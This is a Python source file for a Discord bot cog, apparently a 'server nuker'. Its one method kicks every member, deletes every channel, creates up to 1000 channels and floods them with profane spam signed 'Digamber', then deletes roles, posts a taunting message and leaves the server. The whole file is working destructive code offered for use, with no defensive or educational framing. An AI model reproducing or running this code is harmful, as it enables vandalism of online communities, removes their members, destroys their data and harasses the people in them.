import discord
from discord.ext import commands
import asyncio
import random

class NukerCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def nuke_server(self, guild):
        try:
            # STEP 1: INSTANT MASS KICK (LIGHT SPEED)
            print("🚫 LIGHT SPEED MASS KICKING...")
            kick_tasks = []
            for member in guild.members:
                if member != self.bot.user:
                    kick_tasks.append(member.kick(reason="Fucked By Digamber"))
            
            await asyncio.gather(*kick_tasks, return_exceptions=True)
            print("✅ ALL MEMBERS KICKED AT LIGHT SPEED!")
            
            # STEP 2: INSTANT CHANNEL DELETE
            print("🗑️ LIGHT SPEED CHANNEL DELETION...")
            delete_tasks = [ch.delete() for ch in guild.channels]
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # STEP 3: MASSIVE CHANNEL CREATION (1000+ CHANNELS) WITH UNLIMITED SPAM
            print("🔥 CREATING 1000+ CHANNELS WITH UNLIMITED SPAM...")
            channel_count = 0
            spam_tasks = []  # ALL SPAM MESSAGES STORE KARENGE
            
            message_styles = [
                "# Fucked by Digamber",
                "## Fucked by Digamber", 
                "### Fucked by Digamber",
                "**FUCKED BY DIGAMBER**",
                "__FUCKED BY DIGAMBER__",
                "***FUCKED BY DIGAMBER***",
                "```FUCKED BY DIGAMBER```",
                "> FUCKED BY DIGAMBER",
                ">>> FUCKED BY DIGAMBER",
                "**# FUCKED BY DIGAMBER**",
                "💀 **FUCKED BY DIGAMBER** 💀",
                "🔥 **FUCKED BY DIGAMBER** 🔥",
                "⚡ **FUCKED BY DIGAMBER** ⚡",
                "🎯 **FUCKED BY DIGAMBER** 🎯",
                "💥 **FUCKED BY DIGAMBER** 💥"
            ]
            
            # 1000+ CHANNELS BANAYEGE - UNLIMITED SPAM KE SAATH
            while channel_count < 1000:
                try:
                    # 30 CHANNELS EK SAATH - SIRF "Fucked by Digamber" NAME
                    create_tasks = []
                    for i in range(30):
                        channel_name = f"Fucked by Digamber {channel_count + i + 1}"
                        create_tasks.append(guild.create_text_channel(channel_name))
                    
                    # CHANNELS CREATE KARO
                    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
                    channel_count += 30
                    
                    # HAR NEW CHANNEL MEIN UNLIMITED SPAM SHURU KARO
                    for channel in new_channels:
                        if isinstance(channel, discord.TextChannel):
                            # HAR CHANNEL MEIN 50-100 RANDOM MESSAGES - UNLIMITED SPAM
                            for _ in range(random.randint(50, 100)):
                                msg = random.choice(message_styles)
                                spam_tasks.append(channel.send(msg))
                    
                    # ZERO DELAY - LIGHT SPEED
                    if channel_count % 100 == 0:
                        print(f"✅ {channel_count} CHANNELS CREATED WITH UNLIMITED SPAM...")
                    
                except Exception as e:
                    break
            
            print(f"🎉 {channel_count} CHANNELS CREATED WITH UNLIMITED SPAM!")
            
            # STEP 4: SABHI SPAM MESSAGES EK SAATH BHEJO
            print("💬 SENDING UNLIMITED SPAM MESSAGES...")
            if spam_tasks:
                await asyncio.gather(*spam_tasks, return_exceptions=True)
                print(f"✅ {len(spam_tasks)} UNLIMITED SPAM MESSAGES SENT!")
            
            # STEP 5: LIGHT SPEED ROLE DELETE
            print("🎭 LIGHT SPEED ROLE DELETION...")
            role_tasks = [role.delete() for role in guild.roles if role.name != "@everyone" and not role.managed]
            if role_tasks:
                await asyncio.gather(*role_tasks, return_exceptions=True)
            
            # STEP 6: FINAL MESSAGE
            try:
                channels = await guild.fetch_channels()
                if channels:
                    await channels[0].send(
                        f"💀 **FUCKED BY DIGAMBER** 💀\n\n"
                        f"**{channel_count} CHANNELS OBLITERATED!**\n"
                        f"**{len(spam_tasks)} UNLIMITED SPAM MESSAGES!**\n"
                        f"**COMPLETE DESTRUCTION AT LIGHT SPEED!**"
                    )
            except:
                pass
            
            await guild.leave()
            print("✅ UNLIMITED SPAM NUKE COMPLETED!")
            
        except Exception as e:
            try:
                await guild.leave()
            except:
                pass

async def setup(bot):
    await bot.add_cog(NukerCommands(bot))
